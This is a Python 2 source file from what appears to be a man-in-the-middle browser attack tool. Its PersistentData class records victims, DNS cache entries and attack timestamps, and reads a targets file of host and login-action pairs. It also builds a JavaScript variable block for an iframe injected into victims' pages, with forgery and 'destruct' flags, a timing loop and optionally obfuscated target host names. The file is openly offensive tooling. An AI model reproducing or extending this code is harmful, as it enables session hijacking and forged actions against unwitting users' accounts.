import time

class PersistentData:    

    _instance = None

    def __init__(self):
        self._LUPIN_TOKEN      	= "qaz123xsw654edc789rfv"
        self._FRAME				= 'm'
        self._FORGERY			= 'f'
        self._BOUNTY			= 'b'
        self._DESTRUCT			= 'd'
        self._404				= -1
        self._LUPIN				= 0
        self._PROXY				= 1
        self.dnsCache        	= {}
        self.lastAttackTime  	= {}
        self.victims         	= []
        self.loginActions    	= {}
        self.masterIframeVars	= ""

    def addDnsCache(self, host, address):
        self.dnsCache[host] = address
        

    def setLoginActions(self,targets_fd):
	
        targets_fd.seek(0,0)
        for filelineno, line in enumerate(targets_fd):
            if "\n" in line:
                line = line[:-1]
                
            host_action = line.split("|")
            if len(host_action) != 2:
                print "ERROR: targets line "+str(filelineno)+": "+line
            else:
                if host_action[0].startswith("http://"):
                    host_action[0] = host_action[0][7:]

                slash = host_action[0].find('/')
                if slash != -1:
                    host_action[0] = host_action[0][:slash]
            
                self.loginActions[host_action[0]] = "'"+host_action[1]+"'"


    def setLastAttackTime(self, client):
        self.lastAttackTime[client] = time.time()

  
    def addVictim(self, client):
        self.victims.append(client)


    def oldVictim(self, client):
        if client in self.victims:
            return True
        return False


    def setMasterIframeVars(self,sleepDuration,targets_fd,runWhileInFocus, nibble, obfuscateTargets):
        self.masterIframeVars = "var _LUPIN_TOKEN=\""+self._LUPIN_TOKEN+"\"; var _FORGERY =\""+self._FORGERY+"\" ;var _DESTRUCT =\""+self._DESTRUCT+"\" ;var targetsObfuscated="+obfuscateTargets+"; var runWhileInFocus="+runWhileInFocus+"; var nibble="+nibble+"; var sleepDuration ="+str(sleepDuration)+";var targets=["
        targets_fd.seek(0,0)
        for filelineno,line in enumerate(targets_fd):
            if '\n' in line:
                line = line[:-1]
                
            if line.startswith("http://"):
                line= line[7:]

            host = line.split("|")[0]

            if obfuscateTargets == "true":
                self.masterIframeVars += "\""+self.obfuscate(host)+"\","
                
            else:
                self.masterIframeVars += "\""+host+'\",' 
            	
        self.masterIframeVars = self.masterIframeVars[:-1] + "];"


 
    def obfuscate(self,host):
        obfs = ""
        for letter in host:
            obfs+=str(ord(letter)+255)+"."
        return obfs[:-1]

    
    
    def getInstance():
        if PersistentData._instance == None:
            PersistentData._instance = PersistentData()
        return PersistentData._instance
        

    getInstance = staticmethod(getInstance)



